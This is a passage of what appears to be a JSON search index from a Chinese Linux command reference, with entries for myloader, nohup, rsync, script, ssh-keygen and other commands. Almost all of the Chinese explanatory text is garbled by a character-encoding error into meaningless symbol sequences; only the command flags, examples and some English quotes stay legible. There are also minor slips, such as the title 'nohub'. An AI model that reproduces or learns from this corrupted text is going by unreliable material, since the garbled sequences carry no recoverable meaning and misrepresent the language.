--overwrite-tables å¦‚æœè¦æ¢å¤çš„è¡¨å­˜åœ¨ï¼Œåˆ™å…ˆdropæ‰è¯¥è¡¨ï¼Œä½¿ç”¨è¯¥å‚æ•°ï¼Œéœ€è¦å¤‡ä»½æ—¶å€™è¦å¤‡ä»½è¡¨ç»“æ„ -B , --database éœ€è¦è¿˜åŸçš„æ•°æ®åº“ -e , --enable-binlog å¯ç”¨è¿˜åŸæ•°æ®çš„äºŒè¿›åˆ¶æ—¥å¿— -h , --host ä¸»æœº -u , --user è¿˜åŸçš„ç”¨æˆ· -p , --password å¯†ç  -P , --port ç«¯å£ -S , --socket socketæ–‡ä»¶ -t , --threads è¿˜åŸæ‰€ä½¿ç”¨çš„çº¿ç¨‹æ•°ï¼Œé»˜è®¤æ˜¯4 -C , --compress-protocol å‹ç¼©åè®® -V , --version æ˜¾ç¤ºç‰ˆæœ¬ -v , --verbose è¾“å‡ºæ¨¡å¼, 0 = silent, 1 = errors, 2 = warnings, 3 = info, é»˜è®¤ä¸º2 ç›¸å…³æŒ‡ä»¤ mydumper , ç”¨äºæ•°æ®å¤‡ä»½","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-myloader.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-myloader.html"},{"title":"nohub","text":"ä¸æŒ‚æ–­åœ°è¿è¡Œå‘½ä»¤ã€‚no hangupçš„ç¼©å†™ï¼Œæ„å³\"ä¸æŒ‚æ–­\"ã€‚ nohupè¿è¡Œç”± Commandå‚æ•°å’Œä»»ä½•ç›¸å…³çš„ Argå‚æ•°æŒ‡å®šçš„å‘½ä»¤ï¼Œå¿½ç•¥æ‰€æœ‰æŒ‚æ–­ï¼ˆSIGHUPï¼‰ä¿¡å·ï¼› ä¸æŒ‚æ–­çš„è¿è¡Œï¼Œæ³¨æ„æ²¡æœ‰åå°è¿è¡ŒåŠŸèƒ½ ã€‚ å°±æ˜¯æŒ‡ï¼Œç”¨nohupè¿è¡Œå‘½ä»¤å¯ä»¥ä½¿å‘½ä»¤æ°¸ä¹…çš„æ‰§è¡Œä¸‹å»ï¼Œå’Œç”¨æˆ·ç»ˆç«¯æ²¡æœ‰å…³ç³»ï¼Œ ä¾‹å¦‚æˆ‘ä»¬æ–­å¼€SSHè¿æ¥éƒ½ä¸ä¼šå½±å“ä»–çš„è¿è¡Œ. æ³¨è§£ nohupæ²¡æœ‰åå°è¿è¡Œçš„æ„æ€ï¼›&æ‰æ˜¯åå°è¿è¡Œ &æ˜¯æŒ‡åœ¨åå°è¿è¡Œï¼Œä½†å½“ç”¨æˆ·æ¨å‡º(æŒ‚èµ·)çš„æ—¶å€™ï¼Œå‘½ä»¤è‡ªåŠ¨ä¹Ÿè·Ÿç€é€€å‡º é‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥å·§å¦™çš„å§ä»–ä»¬ç»“åˆèµ·æ¥ç”¨å°±æ˜¯ nohup COMMAND & è¿™æ ·å°±èƒ½ä½¿å‘½ä»¤æ°¸ä¹…çš„åœ¨åå°æ‰§è¡Œ","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-noHub.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-noHub.html"},{"title":"partprobe","text":"æ›´æ–°linuxæ ¸å¿ƒçš„åˆ†åŒºè¡¨ä¿¡æ¯","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-partprobe.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-partprobe.html"},{"title":"passwd","text":"ä¿®æ”¹å¯†ç ","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-passwd.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-passwd.html"},{"title":"paste","text":"å°†ä¸¤ä¸ªæ–‡ä»¶ç›¸åŒè¡Œçš„æ•°æ®ç²˜åœ¨ä¸€èµ·ï¼Œä»¥tabéš”å¼€ ç›¸ä¼¼æŒ‡ä»¤ expand","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-paste.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-paste.html"},{"title":"patch","text":"å¯¹æ¯”ä¸¤ä¸ªæ–‡ä»¶å˜åŒ– åˆ¶ä½œè¡¥ä¸","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-patch.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-patch.html"},{"title":"df","text":"dfï¼Œdisk freeï¼Œ é€šè¿‡æ–‡ä»¶ç³»ç»Ÿæ¥å¿«é€Ÿè·å–ç©ºé—´å¤§å°çš„ä¿¡æ¯ï¼Œ å½“æˆ‘ä»¬åˆ é™¤ä¸€ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸æ˜¯é©¬ä¸Šå°±åœ¨æ–‡ä»¶ç³»ç»Ÿå½“ä¸­æ¶ˆå¤±äº†ï¼Œ è€Œæ˜¯æš‚æ—¶æ¶ˆå¤±äº†ï¼Œå½“æ‰€æœ‰ç¨‹åºéƒ½ä¸ç”¨æ—¶ï¼Œ æ‰ä¼šæ ¹æ®OSçš„è§„åˆ™é‡Šæ”¾æ‰å·²ç»åˆ é™¤çš„æ–‡ä»¶ï¼Œ dfè®°å½•çš„æ˜¯é€šè¿‡æ–‡ä»¶ç³»ç»Ÿè·å–åˆ°çš„æ–‡ä»¶çš„å¤§å°ï¼Œ ä»–æ¯” du å¼ºçš„åœ°æ–¹å°±æ˜¯ èƒ½å¤Ÿçœ‹åˆ°å·²ç»åˆ é™¤çš„æ–‡ä»¶ ï¼Œ è€Œä¸”è®¡ç®—å¤§å°çš„æ—¶å€™ï¼ŒæŠŠè¿™ä¸€éƒ¨åˆ†çš„ç©ºé—´ä¹ŸåŠ ä¸Šäº†ï¼Œ æ›´ç²¾ç¡®äº†ã€‚(å½“æ–‡ä»¶ç³»ç»Ÿä¹Ÿç¡®å®šåˆ é™¤äº†è¯¥æ–‡ä»¶åï¼Œè¿™æ—¶å€™duä¸dfå°±ä¸€è‡´äº†ã€‚) å…³äºåˆ é™¤æœºåˆ¶è§ /docs/æ“ä½œç³»ç»Ÿ/linux/æ¦‚å¿µæ€§/linuxåˆ é™¤æœºåˆ¶","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-place.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-place.html"},{"title":"rsync","text":"rsync æ˜¯ä¸€ä¸ªè¿œç¨‹æ•°æ®åŒæ­¥å·¥å…·ï¼Œå¯é€šè¿‡LAN/WANå¿«é€ŸåŒæ­¥å¤šå°ä¸»æœºé—´çš„æ–‡ä»¶ã€‚ rsyncä½¿ç”¨æ‰€è°“çš„\"rsyncç®—æ³•\"æ¥ä½¿æœ¬åœ°å’Œè¿œç¨‹ä¸¤ä¸ªä¸»æœºä¹‹é—´çš„æ–‡ä»¶è¾¾åˆ°åŒæ­¥ï¼Œ è¿™ä¸ªç®—æ³•åªä¼ é€ä¸¤ä¸ªæ–‡ä»¶çš„ä¸åŒéƒ¨åˆ†ï¼Œè€Œä¸æ˜¯æ¯æ¬¡éƒ½æ•´ä»½ä¼ é€ï¼Œå› æ­¤é€Ÿåº¦ç›¸å½“å¿«ã€‚ rsyncæ˜¯ä¸€ä¸ªåŠŸèƒ½éå¸¸å¼ºå¤§çš„å·¥å…·ï¼Œå…¶å‘½ä»¤ä¹Ÿæœ‰å¾ˆå¤šåŠŸèƒ½ç‰¹è‰²é€‰é¡¹ï¼Œæˆ‘ä»¬ä¸‹é¢å°±å¯¹å®ƒçš„é€‰é¡¹ä¸€ä¸€è¿›è¡Œåˆ†æè¯´æ˜ã€‚ è¯­æ³•: rsync [OPTION]... SRC DEST rsync [OPTION]... SRC [USER@]host:DEST rsync [OPTION]... [USER@]HOST:SRC DEST rsync [OPTION]... [USER@]HOST::SRC DEST rsync [OPTION]... SRC [USER@]HOST::DEST rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST] å¯¹åº”äºä»¥ä¸Šå…­ç§å‘½ä»¤æ ¼å¼ï¼Œrsyncæœ‰å…­ç§ä¸åŒçš„å·¥ä½œæ¨¡å¼ æ‹·è´æœ¬åœ°æ–‡ä»¶ å½“SRCå’ŒDESè·¯å¾„ä¿¡æ¯éƒ½ä¸åŒ…å«æœ‰å•ä¸ªå†’å· \":\" åˆ†éš”ç¬¦æ—¶å°±å¯åŠ¨è¿™ç§å·¥ä½œæ¨¡å¼. å¦‚: rsync -a /data /backup æœ¬åœ°->è¿œç¨‹ ä½¿ç”¨ä¸€ä¸ªè¿œç¨‹shellç¨‹åº(å¦‚rshã€ssh)æ¥å®ç°å°†æœ¬åœ°æœºå™¨çš„å†…å®¹æ‹·è´åˆ°è¿œç¨‹æœºå™¨ã€‚ å½“DSTè·¯å¾„åœ°å€åŒ…å«å•ä¸ªå†’å·\":\"åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼. å¦‚: rsync -avz *.c foo:src è¿œç¨‹->æœ¬åœ° ä½¿ç”¨ä¸€ä¸ªè¿œç¨‹shellç¨‹åº(å¦‚rshã€ssh)æ¥å®ç°å°†è¿œç¨‹æœºå™¨çš„å†…å®¹æ‹·è´åˆ°æœ¬åœ°æœºå™¨ã€‚ å½“SRCåœ°å€è·¯å¾„åŒ…å«å•ä¸ªå†’å·\":\"åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼. å¦‚: rsync -avz foo:src/bar /data è¿œç¨‹rsyncæœåŠ¡->æœ¬åœ° ä»è¿œç¨‹rsyncæœåŠ¡å™¨ä¸­æ‹·è´æ–‡ä»¶åˆ°æœ¬åœ°æœºã€‚ å½“SRCè·¯å¾„ä¿¡æ¯åŒ…å«\"::\"åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼. å¦‚: rsync -av root@192.168.78.192::www /databack æœ¬åœ°->è¿œç¨‹rsyncæœåŠ¡ ä»æœ¬åœ°æœºå™¨æ‹·è´æ–‡ä»¶åˆ°è¿œç¨‹rsyncæœåŠ¡å™¨ä¸­ã€‚ å½“DSTè·¯å¾„ä¿¡æ¯åŒ…å«\"::\"åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼. å¦‚: rsync -av /databack root@192.168.78.192::www åˆ—è¿œç¨‹æœºçš„æ–‡ä»¶åˆ—è¡¨ ç±»ä¼¼äºrsyncä¼ è¾“ï¼Œä¸è¿‡åªè¦åœ¨å‘½ä»¤ä¸­çœç•¥æ‰æœ¬åœ°æœºä¿¡æ¯å³å¯. å¦‚: rsync -v rsync://192.168.78.192/www é€‰é¡¹ -v , --verbose è¯¦ç»†æ¨¡å¼è¾“å‡º, å¯ä»¥æ‰“å°ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚æ–‡ä»¶åˆ—è¡¨ã€æ–‡ä»¶æ•°é‡ç­‰ -q , --quiet ç²¾ç®€è¾“å‡ºæ¨¡å¼ã€‚ -c , --checksum æ‰“å¼€æ ¡éªŒå¼€å…³ï¼Œå¼ºåˆ¶å¯¹æ–‡ä»¶ä¼ è¾“è¿›è¡Œæ ¡éªŒã€‚ -a , --archive å½’æ¡£æ¨¡å¼ï¼Œè¡¨ç¤ºä»¥é€’å½’æ–¹å¼ä¼ è¾“æ–‡ä»¶ï¼Œå¹¶ä¿æŒæ‰€æœ‰æ–‡ä»¶å±æ€§ï¼Œç­‰äº -rlptgoD -a é€‰é¡¹åé¢å¯ä»¥è·Ÿä¸€ä¸ª --no-OPTIONï¼Œè¡¨ç¤ºå…³é—­ -rã€-lã€-pã€-tã€-gã€-oã€-D ä¸­çš„æŸä¸€ä¸ªï¼Œæ¯”å¦‚: -a --no-l ç­‰åŒäº: -rã€-pã€-tã€-gã€-oã€-D é€‰é¡¹ã€‚ -r , --recursive è¡¨ç¤ºä»¥é€’å½’æ¨¡å¼å¤„ç†å­ç›®å½•ï¼Œå®ƒä¸»è¦æ˜¯é’ˆå¯¹ç›®å½•æ¥è¯´çš„ï¼Œ å¦‚æœå•ç‹¬ä¼ ä¸€ä¸ªæ–‡ä»¶ä¸éœ€è¦åŠ  -r é€‰é¡¹ï¼Œä½†æ˜¯ä¼ è¾“ç›®å½•æ—¶å¿…é¡»åŠ  -R , --relative ä½¿ç”¨ç›¸å¯¹è·¯å¾„ä¿¡æ¯ã€‚ -b , --backup åˆ›å»ºå¤‡ä»½ï¼Œä¹Ÿå°±æ˜¯å¯¹äºç›®çš„å·²ç»å­˜åœ¨æœ‰åŒæ ·çš„æ–‡ä»¶åæ—¶ï¼Œ å°†è€çš„æ–‡ä»¶é‡æ–°å‘½åä¸º~filenameã€‚å¯ä»¥ä½¿ç”¨ --suffix é€‰é¡¹æ¥æŒ‡å®šä¸åŒçš„å¤‡ä»½æ–‡ä»¶å‰ç¼€ã€‚ --backup-dir å°†å¤‡ä»½æ–‡ä»¶(å¦‚~filename)å­˜æ”¾åœ¨åœ¨ç›®å½•ä¸‹ã€‚ --suffix= <SUFFIX> å®šä¹‰å¤‡ä»½æ–‡ä»¶å‰ç¼€(å¥½åƒåªæœ‰ä¸€ä¸ªæ -suffix)ã€‚ -u , --update ä»…ä»…è¿›è¡Œæ›´æ–°ï¼Œä¹Ÿå°±æ˜¯è·³è¿‡æ‰€æœ‰å·²ç»å­˜åœ¨äºDSTï¼Œå¹¶ä¸”æ–‡ä»¶æ—¶é—´æ™šäºè¦å¤‡ä»½çš„æ–‡ä»¶ï¼Œ æˆ–è€…è¯´æŠŠ DEST ä¸­æ¯” SRC è¿˜æ–°çš„æ–‡ä»¶æ’é™¤æ‰ï¼Œä¸ä¼šè¦†ç›– -l , --links ä¿ç•™è½¯é“¾æ¥ -L , --copy-links è¡¨ç¤ºåƒå¯¹å¾…å¸¸è§„æ–‡ä»¶ä¸€æ ·å¤„ç†è½¯é“¾æ¥. å¦‚æœæ˜¯ SRC ä¸­æœ‰è½¯é“¾æ¥æ–‡ä»¶ï¼Œåˆ™åŠ ä¸Šè¯¥é€‰é¡¹åï¼Œå°†ä¼šæŠŠè½¯è¿æ¥æŒ‡å‘çš„ç›®æ ‡æ–‡ä»¶å¤åˆ¶åˆ° DEST --copy-unsafe-links ä»…ä»…æ‹·è´æŒ‡å‘SRCè·¯å¾„ç›®å½•æ ‘ä»¥å¤–çš„é“¾æ¥ --safe-links å¿½ç•¥æŒ‡å‘SRCè·¯å¾„ç›®å½•æ ‘ä»¥å¤–çš„é“¾æ¥ã€‚ -H , --hard-links ä¿ç•™ç¡¬é“¾æ¥ã€‚ -p , --perms ä¿æŒæ–‡ä»¶æƒé™ -o , --owner ä¿æŒæ–‡ä»¶å±ä¸»ä¿¡æ¯ -g , --group ä¿æŒæ–‡ä»¶å±ç»„ä¿¡æ¯ -D , --devices ä¿æŒè®¾å¤‡æ–‡ä»¶ä¿¡æ¯ -t , --times ä¿æŒæ–‡ä»¶æ—¶é—´ä¿¡æ¯ -S , --sparse å¯¹ç¨€ç–æ–‡ä»¶è¿›è¡Œç‰¹æ®Šå¤„ç†ä»¥èŠ‚çœDSTçš„ç©ºé—´ã€‚ -n , --dry-run æ˜¾ç¤ºå“ªäº›æ–‡ä»¶å°†è¢«ä¼ è¾“ã€‚ -w , --whole-file æ‹·è´æ–‡ä»¶ï¼Œä¸è¿›è¡Œå¢é‡æ£€æµ‹ã€‚ -x , --one-file-system ä¸è¦è·¨è¶Šæ–‡ä»¶ç³»ç»Ÿè¾¹ç•Œã€‚ -B , --block-size= SIZE æ£€éªŒç®—æ³•ä½¿ç”¨çš„å—å°ºå¯¸ï¼Œé»˜è®¤æ˜¯700å­—èŠ‚ã€‚ -e , --rsh= command æŒ‡å®šä½¿ç”¨rshã€sshæ–¹å¼è¿›è¡Œæ•°æ®åŒæ­¥ã€‚ --rsync-path= PATH æŒ‡å®šè¿œç¨‹æœåŠ¡å™¨ä¸Šçš„rsyncå‘½ä»¤æ‰€åœ¨è·¯å¾„ä¿¡æ¯ã€‚ -C , --cvs-exclude ä½¿ç”¨å’ŒCVSä¸€æ ·çš„æ–¹æ³•è‡ªåŠ¨å¿½ç•¥æ–‡ä»¶ï¼Œç”¨æ¥æ’é™¤é‚£äº›ä¸å¸Œæœ›ä¼ è¾“çš„æ–‡ä»¶ã€‚ --existing ä»…ä»…æ›´æ–°é‚£äº›å·²ç»å­˜åœ¨äºDSTçš„æ–‡ä»¶ï¼Œè€Œä¸å¤‡ä»½é‚£äº›æ–°åˆ›å»ºçš„æ–‡ä»¶ã€‚ --delete åˆ é™¤é‚£äº› DST ä¸­ SRC æ²¡æœ‰çš„æ–‡ä»¶ --delete-excluded åŒæ ·åˆ é™¤æ¥æ”¶ç«¯é‚£äº›è¢«è¯¥é€‰é¡¹æŒ‡å®šæ’é™¤çš„æ–‡ä»¶ã€‚ --delete-after ä¼ è¾“ç»“æŸä»¥åå†åˆ é™¤ã€‚ --ignore-errors åŠæ—¶å‡ºç°IOé”™è¯¯ä¹Ÿè¿›è¡Œåˆ é™¤ã€‚ --max-delete= NUM æœ€å¤šåˆ é™¤NUMä¸ªæ–‡ä»¶ã€‚ -P , --partial ä¿ç•™é‚£äº›å› æ•…æ²¡æœ‰å®Œå…¨ä¼ è¾“çš„æ–‡ä»¶ï¼ŒåŠ å¿«éšåçš„å†æ¬¡ä¼ è¾“. å‚æ•°å…è®¸æ¢å¤ä¸­æ–­çš„ä¼ è¾“. ä¸ä½¿ç”¨è¯¥å‚æ•°æ—¶, rsync ä¼šåˆ é™¤ä¼ è¾“åˆ°ä¸€åŠè¢«æ‰“æ–­çš„æ–‡ä»¶ ä½¿ç”¨è¯¥å‚æ•°åï¼Œä¼ è¾“åˆ°ä¸€åŠçš„æ–‡ä»¶ä¹Ÿä¼šåŒæ­¥åˆ°ç›®æ ‡ç›®å½•ï¼Œä¸‹æ¬¡åŒæ­¥æ—¶å†æ¢å¤ä¸­æ–­çš„ä¼ è¾“ã€‚ ä¸€èˆ¬éœ€è¦ä¸ --append æˆ– --append-verify é…åˆä½¿ç”¨ --force å¼ºåˆ¶åˆ é™¤ç›®å½•ï¼Œå³ä½¿ä¸ä¸ºç©ºã€‚ --numeric-ids ä¸å°†æ•°å­—çš„ç”¨æˆ·å’Œç»„idåŒ¹é…ä¸ºç”¨æˆ·åå’Œç»„åã€‚ --timeout= time ipè¶…æ—¶æ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚ -I , --ignore-times ä¸è·³è¿‡é‚£äº›æœ‰åŒæ ·çš„æ—¶é—´å’Œé•¿åº¦çš„æ–‡ä»¶ã€‚ --size-only å½“å†³å®šæ˜¯å¦è¦å¤‡ä»½æ–‡ä»¶æ—¶ï¼Œä»…ä»…å¯Ÿçœ‹æ–‡ä»¶å¤§å°è€Œä¸è€ƒè™‘æ–‡ä»¶æ—¶é—´ã€‚ --modify-window= NUM å†³å®šæ–‡ä»¶æ˜¯å¦æ—¶é—´ç›¸åŒæ—¶ä½¿ç”¨çš„æ—¶é—´æˆ³çª—å£ï¼Œé»˜è®¤ä¸º0ã€‚ -T , --temp-dir= DIR åœ¨DIRä¸­åˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚ --compare-dest= DIR åŒæ ·æ¯”è¾ƒDIRä¸­çš„æ–‡ä»¶æ¥å†³å®šæ˜¯å¦éœ€è¦å¤‡ä»½ -z , --compress å¯¹å¤‡ä»½çš„æ–‡ä»¶åœ¨ä¼ è¾“æ—¶è¿›è¡Œå‹ç¼©å¤„ç† --exclude= PATTERN æŒ‡å®šæ’é™¤ä¸éœ€è¦ä¼ è¾“çš„æ–‡ä»¶æ¨¡å¼, ç­‰å·åé¢è·Ÿæ–‡ä»¶åï¼Œå¯ä»¥æ˜¯é€šé…ç¬¦æ¨¡å¼ï¼ˆå¦‚ *.txt ï¼‰ --include= PATTERN æŒ‡å®šä¸æ’é™¤è€Œéœ€è¦ä¼ è¾“çš„æ–‡ä»¶æ¨¡å¼ã€‚ --exclude-from= FILE æ’é™¤FILEä¸­æŒ‡å®šæ¨¡å¼çš„æ–‡ä»¶ã€‚ --include-from= FILE ä¸æ’é™¤FILEæŒ‡å®šæ¨¡å¼åŒ¹é…çš„æ–‡ä»¶ã€‚ --version æ‰“å°ç‰ˆæœ¬ä¿¡æ¯ã€‚ --address ç»‘å®šåˆ°ç‰¹å®šçš„åœ°å€ã€‚ --config= FILE æŒ‡å®šå…¶ä»–çš„é…ç½®æ–‡ä»¶ï¼Œä¸ä½¿ç”¨é»˜è®¤çš„rsyncd.confæ–‡ä»¶ã€‚ --port= PORT æŒ‡å®šå…¶ä»–çš„rsyncæœåŠ¡ç«¯å£ã€‚ --blocking-io å¯¹è¿œç¨‹shellä½¿ç”¨é˜»å¡IOã€‚ -s tats ç»™å‡ºæŸäº›æ–‡ä»¶çš„ä¼ è¾“çŠ¶æ€ã€‚ --progress è¡¨ç¤ºåœ¨åŒæ­¥çš„è¿‡ç¨‹ä¸­å¯ä»¥çœ‹åˆ°åŒæ­¥çš„è¿‡ç¨‹çŠ¶æ€ï¼Œæ¯”å¦‚ç»Ÿè®¡è¦åŒæ­¥çš„æ–‡ä»¶æ•°é‡ã€ åŒæ­¥çš„æ–‡ä»¶ä¼ è¾“é€Ÿåº¦ç­‰ --log-format= formAT æŒ‡å®šæ—¥å¿—æ–‡ä»¶æ ¼å¼ã€‚ --password-file= FILE ä»FILEä¸­å¾—åˆ°å¯†ç ã€‚ --bwlimit= KBPS é™åˆ¶I/Oå¸¦å®½ï¼ŒKBytes per second -h , --help æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ --append å‚æ•°æŒ‡å®šæ–‡ä»¶æ¥ç€ä¸Šæ¬¡ä¸­æ–­çš„åœ°æ–¹ï¼Œç»§ç»­ä¼ è¾“ --append-verify å‚æ•°è·Ÿ --append å‚æ•°ç±»ä¼¼ï¼Œä½†ä¼šå¯¹ä¼ è¾“å®Œæˆåçš„æ–‡ä»¶è¿›è¡Œä¸€æ¬¡æ ¡éªŒã€‚ å¦‚æœæ ¡éªŒå¤±è´¥ï¼Œå°†é‡æ–°å‘é€æ•´ä¸ªæ–‡ä»¶ã€‚ å¯¹äºåˆå­¦è€…æ¥è¯´ï¼Œè®°ä½æœ€å¸¸ç”¨çš„å‡ ä¸ªå³å¯ï¼Œæ¯”å¦‚ -aã€-vã€-zã€--delete å’Œ --excludeã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-rsync.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-rsync.html"},{"title":"script","text":"åˆ›å»ºç»ˆç«¯ä¼šè¯çš„ text/x-script , è®°å½•ç»ˆç«¯ä¼šè¯å¹¶ç”Ÿæˆå¯é‡æ’­çš„è„šæœ¬ ç”¨æ³•: script [option] [file] æ”¯æŒçš„é€‰é¡¹: -a , --append å¢åŠ åˆ°è¾“å‡º. åœ¨ç°æœ‰è¾“å‡ºå½•åˆ¶çš„æ–‡ä»¶çš„å†…å®¹ä¸Šè¿½åŠ æ–°çš„å†…å®¹ -c , --command <command> ç›´æ¥æ‰§è¡Œç»™å®šçš„commandæŒ‡ä»¤è€Œä¸æ˜¯å¯åŠ¨ä¸€ä¸ªäº¤äº’å¼ç»ˆç«¯. -r å­è¿›ç¨‹ä¸­è¿”å›é€€å‡ºä»£ç  -e , --return return exit code of the child process -f , --flush run flush after each write å¦‚æœéœ€è¦åœ¨è¾“å‡ºåˆ°æ—¥å¿—æ–‡ä»¶çš„åŒæ—¶ï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶çš„å†…å®¹ ï¼Œå¯ä»¥ä½¿ç”¨ -f å‚æ•° PS:å¯ä»¥ç”¨äºæ•™å­¦,ä¸¤ä¸ªå‘½ä»¤è¡Œæ¥-få¯ä»¥å®æ—¶æ¼”ç¤º --force use output file even when it is a link -q , --quiet be quiet. ä½¿scriptå‘½ä»¤ä»¥é™é»˜æ¨¡å¼è¿è¡Œ -V , --version output version information and exit. è¾“å‡ºscriptçš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œç„¶åé€€å‡º -h , --help display this help and exit è¾“å‡ºscriptçš„å¸®åŠ©ä¿¡æ¯ï¼Œç„¶åé€€å‡º. -t, --timing[=<file>] output timing data to stderr (or to FILE). æŒ‡æ˜è¾“å‡ºå½•åˆ¶çš„æ—¶é—´æ•°æ® å¦‚, è®°å½•ç»ˆç«¯çš„è¾“å‡ºåˆ°æ–‡ä»¶: script -c \"pv some_file.txt\" /tmp/out.cast ç»“åˆç”¨ä¾‹è¯´æ˜ script æŒ‡ä»¤å¯ä»¥ç”¨æ¥è®°å½•ç»ˆç«¯ä¼šè¯å¹¶ç”Ÿæˆå¯é‡æ’­çš„è„šæœ¬ã€‚ ä½¿ç”¨scriptæ—¶,å®ƒä¼šåˆ›å»ºä¸€ä¸ªç±»å‹ä¸ºtext/x-scriptçš„æ–‡ä»¶,è¿™ä¸ªæ–‡ä»¶ä¸­åŒ…å«äº†ä½ åœ¨ç»ˆç«¯ä¸­æ‰€æœ‰æ“ä½œçš„è®°å½•,åŒ…æ‹¬è¾“å…¥å’Œè¾“å‡ºã€‚ ä¾‹å¦‚: script demo.script è¿™å°†å¯åŠ¨ script,å¹¶å°†ä½ çš„ç»ˆç«¯è®°å½•å†™å…¥ demo.script æ–‡ä»¶ã€‚ åœ¨è¿™ä¸ªä¼šè¯ç»“æŸå,demo.script å°±åŒ…å«äº†ä¸€ä¸ªå¯ä»¥é‡æ’­ä½ æ‰€æœ‰æ“ä½œçš„è„šæœ¬ã€‚ å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤å›æ”¾è¿™ä¸ªä¼šè¯è„šæœ¬: scriptreplay demo.script å®ƒå°†é€æ­¥é‡ç°ä½ ä¹‹å‰åœ¨ç»ˆç«¯ä¸­çš„æ‰€æœ‰æ“ä½œã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-script.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-script.html"},{"title":"rz","text":"åœ¨ç»ˆç«¯ä¸‹è½½æœ¬åœ°æ–‡ä»¶ ç›¸å…³æŒ‡ä»¤ sz","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-serious.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-serious.html"},{"title":"ssh-keygen","text":"ç”Ÿæˆå…¬ç§å¯†é’¥ å¦‚ç”Ÿæˆrsaç§˜é’¥: ssh-keygen -t rsa è¿˜æœ‰ä¸ªå¯ä»¥é…å¯¹ä½¿ç”¨çš„, å¤åˆ¶å…¬é’¥åˆ°éœ€è¦çš„ä¸»æœºï¼Œæˆ–å…¶å®ƒæ–¹å¼å‘é€å…¬é’¥è¿‡å»æ”¹åä¸ºauthorized_keys: ssh-copy-id user@host æ³¨è§£ sshè¿œç¨‹ç™»å½•å¹¶æ‰§è¡ŒæŒ‡ä»¤çš„æ—¶å€™ï¼Œauthorizedé‡Œçš„commandå‚æ•°éœ€è¦åŠ ä¸Š &/bin/bash ä¿æŒç™»é™†: #authorized_keys command=\"ls -al & /bin/bash\" æ›´å¤šå¯è§ https://blog.csdn.net/alifrank/article/details/48241699 å‚æ•°é€‰é¡¹ -m æŒ‡å®šå¯†é’¥çš„æ ¼å¼ï¼ŒPEMï¼ˆä¹Ÿå°±æ˜¯RSAæ ¼å¼ï¼‰æ˜¯ä¹‹å‰ä½¿ç”¨çš„æ—§æ ¼å¼ -b æŒ‡å®šå¯†é’¥é•¿åº¦ï¼› -e è¯»å–opensshçš„ç§é’¥æˆ–è€…å…¬é’¥æ–‡ä»¶ï¼› -C æ·»åŠ æ³¨é‡Šï¼› -f æŒ‡å®šç”¨æ¥ä¿å­˜å¯†é’¥çš„æ–‡ä»¶åï¼› -i è¯»å–æœªåŠ å¯†çš„ssh-v2å…¼å®¹çš„ç§é’¥/å…¬é’¥æ–‡ä»¶ï¼Œç„¶ååœ¨æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Šæ˜¾ç¤ºopensshå…¼å®¹çš„ç§é’¥/å…¬é’¥ï¼› -l æ˜¾ç¤ºå…¬é’¥æ–‡ä»¶çš„æŒ‡çº¹æ•°æ®ï¼› -N æä¾›ä¸€ä¸ªæ–°å¯†è¯­ï¼› -P æä¾›ï¼ˆæ—§ï¼‰å¯†è¯­ï¼› -q é™é»˜æ¨¡å¼ï¼› -t æŒ‡å®šè¦åˆ›å»ºçš„å¯†é’¥ç±»å‹ å…³äºauthorized_keysä¸authorized_keys2 authorized_keys vs authorized_keys2 In OpenSSH releases earlier than 3, the sshd man page said: The $HOME/.ssh/authorized_keys file lists the RSA keys that are permitted for RSA authentication in SSH protocols 1.3 and 1.5 Similarly, the $HOME/.ssh/authorized_keys2 file lists the DSA and RSA keys that are permitted for public key authentication (PubkeyAuthentication) in SSH protocol 2.0. ä¹Ÿå°±æ˜¯è¯´åœ¨sshçš„3ç‰ˆæœ¬ä¹‹å‰: authorized_keys2å¤šæ”¯æŒä¸€ä¸ªDSAåŠ å¯†ç®—æ³• ä¸­æ–‡ç¿»è¯‘: 